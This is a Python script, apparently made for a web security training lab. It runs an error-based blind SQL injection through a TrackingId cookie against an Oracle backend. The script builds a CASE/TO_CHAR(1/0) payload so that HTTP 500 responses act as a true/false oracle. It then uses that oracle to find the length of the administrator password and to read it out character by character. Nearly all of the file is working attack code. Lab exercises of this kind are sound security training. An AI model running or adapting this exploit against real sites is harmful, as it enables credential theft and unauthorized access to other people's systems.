import requests

LAB_URL = input("Lab URL: ").strip().rstrip("/") + "/"
SESSION = input("Session cookie value: ").strip()
TRACKING = input("TrackingId cookie value: ").strip()

CHARSET = "0123456789abcdefghijklmnopqrstuvwxyz"
USERNAME = "administrator"


def oracle(condition: str) -> bool:
    payload = f"'||(SELECT CASE WHEN {condition} THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'"
    cookies = {"TrackingId": TRACKING + payload, "session": SESSION}
    try:
        return requests.get(LAB_URL, cookies=cookies).status_code == 500
    except requests.RequestException:
        return False


def find_length() -> int | None:
    for i in range(1, 100):
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='{USERNAME}') > {i}"
        if not oracle(condition):
            return i
    return None


def extract_password(length: int) -> str:
    password = ""
    for pos in range(1, length + 1):
        base = f"(SELECT password FROM users WHERE username='{USERNAME}')"
        for char in CHARSET:
            condition = f"ASCII(SUBSTR({base}, {pos}, 1)) = {ord(char)}"
            if oracle(condition):
                password += char
                print(f"position {pos}: {char} | {password}")
                break
    return password


length = find_length()
print(f"[*] password length: {length}")

if length:
    password = extract_password(length)
    print(f"[+] password: {password}")